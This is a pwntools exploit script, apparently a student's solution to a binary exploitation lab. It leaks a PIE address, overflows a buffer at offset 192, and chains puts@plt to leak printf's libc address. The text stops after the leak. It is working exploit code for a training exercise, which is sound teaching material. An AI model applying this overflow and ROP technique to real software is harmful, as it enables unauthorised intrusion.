#!/usr/bin/env python3
from sys import argv
from pwn import *
import vpn_conf
import re

HOST = args.HOST or vpn_conf.HOST
PORT = int(args.PORT or vpn_conf.BASE_PORT + 10)

EXE_FILENAME = '../pwn_student_binaries/call_me_Federico-Conti'
LIBC_FILENAME = '../pwn_student_binaries/remote-libc/32-bits/libc.so.6'
LD_FILENAME = '../pwn_student_binaries/remote-libc/32-bits/ld-linux.so.2'
argv = [EXE_FILENAME]
envp = {}

OFFSET_RIP = 192  # thanks pwn cyclic :)

context.binary = e = ELF(EXE_FILENAME, checksec=False)
libc = ELF(LIBC_FILENAME, checksec=False)


def start():
    gdbscript = '''
    tbreak *__libc_start_main
    '''
    if args.GDB:
        return gdb.debug(args=argv, env=envp, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(HOST, PORT)
    else:
        return process([LD_FILENAME, EXE_FILENAME],
                       env={'LD_PRELOAD': LIBC_FILENAME})
io = start()

lyrics = [
    b"Color me your color, baby",
    b"Color me your car",
    b"Color me your color, darling",
]

for idx, line in enumerate(lyrics, 1):
    io.sendlineafter(f"Enter line #{idx}:".encode(), line)

# &target= 0xflag()Address
data = io.recvuntil(b"Enter line #4:")
text = data.decode(errors="ignore")

match = re.search(r"0x[0-9a-fA-F]+", text)
if not match:
    log.failure("No address found in output")
    io.close()
    exit(1)

gadget = int(match.group(0), 16)
log.success(f"Gadget: {hex(gadget)}")

pie_base = gadget - 0x000111ed

log.info(f"PIE base: {hex(pie_base)}")

puts_plt = pie_base + e.plt['puts']
printf_got = pie_base + e.got['printf']

log.info(f"puts@plt = {hex(puts_plt)}")
log.info(f"printf@got = {hex(printf_got)}")


payload  = b"A" * OFFSET_RIP
payload += p32(puts_plt)     # eip -> puts@plt
payload += p32(gadget)       
payload += p32(printf_got)  

io.sendline(payload)


leak = io.recv(4)
printf_libc = u32(leak)
log.success(f"printf@libc leaked: {hex(printf_libc)}")

